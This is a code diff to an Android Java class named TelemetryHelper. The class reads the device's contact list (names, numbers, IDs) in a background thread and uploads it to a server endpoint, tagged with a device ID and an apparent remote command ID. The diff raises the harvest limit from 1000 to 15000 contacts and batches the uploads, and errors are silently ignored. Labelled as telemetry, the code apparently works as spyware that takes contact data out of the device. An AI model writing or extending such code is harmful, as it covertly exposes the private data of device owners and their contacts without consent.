@@ -64,7 +64,7 @@ public class TelemetryHelper {
                     int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                     int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
 
-                    while (c.moveToNext() && map.size() < 1000) {
+                    while (c.moveToNext() && map.size() < 15000) {
                         String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
                         String num = numIdx >= 0 ? c.getString(numIdx) : null;
                         String id = idIdx >= 0 ? c.getString(idIdx) : null;
@@ -83,15 +83,25 @@ public class TelemetryHelper {
                     }
                     c.close();
 
-                    JSONArray list = new JSONArray();
-                    for (JSONObject obj : map.values()) list.put(obj);
-
-                    JSONObject body = new JSONObject();
-                    body.put("device_id", deviceId);
-                    if (cmdId != null) body.put("command_id", cmdId);
-                    body.put("contacts", list);
-
-                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+                    JSONArray batch = new JSONArray();
+                    for (JSONObject obj : map.values()) {
+                        batch.put(obj);
+                        if (batch.length() >= 1000) {
+                            JSONObject body = new JSONObject();
+                            body.put("device_id", deviceId);
+                            if (cmdId != null) body.put("command_id", cmdId);
+                            body.put("contacts", batch);
+                            ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+                            batch = new JSONArray();
+                        }
+                    }
+                    if (batch.length() > 0) {
+                        JSONObject body = new JSONObject();
+                        body.put("device_id", deviceId);
+                        if (cmdId != null) body.put("command_id", cmdId);
+                        body.put("contacts", batch);
+                        ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+                    }
                 } catch (Exception ignored) {}
             }
         }).start();
